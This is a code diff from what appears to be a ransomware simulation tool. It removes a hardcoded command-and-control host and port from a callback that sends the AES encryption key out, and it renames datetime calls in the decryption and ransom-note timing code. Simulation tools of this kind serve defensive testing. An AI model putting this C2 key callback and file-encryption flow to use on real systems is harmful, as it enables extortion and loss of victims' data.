@@ -179,10 +179,7 @@ def run_encrypt() -> None:
 
 
 def run_c2_callback(report: SimulationReport, key: bytes) -> None:
-    c2 = C2Integration(
-        c2_host="10.0.1.1",
-        c2_port=44444,
-    )
+    c2 = C2Integration()
     c2_payload = c2._to_payload(
         aes_key=key.hex(),
         file_encrypted=report.total_files_encrypted,
@@ -231,7 +228,7 @@ def run_decrypt() -> None:
 
         try:
             collector._start_time = (
-                datetime.fromisoformat(existing.get("simulation_start_time", ""))
+                dt.fromisoformat(existing.get("simulation_start_time", ""))
                 if existing.get("simulation_start_time")
                 else None
             )
@@ -258,7 +255,7 @@ def run_decrypt() -> None:
             if r["success"] and r["encrypted_at"]:
                 try:
                     collector._file_timestamps.append(
-                        datetime.fromisoformat(r["encrypted_at"])
+                        dt.fromisoformat(r["encrypted_at"])
                     )
                 except ValueError:
                     pass
@@ -277,7 +274,7 @@ def run_decrypt() -> None:
         # Restore note drop time
         if existing.get("ransom_note_drop_time"):
             try:
-                collector._note_drop_time = datetime.fromisoformat(
+                collector._note_drop_time = dt.fromisoformat(
                     existing["ransom_note_drop_time"]
                 )
             except ValueError:
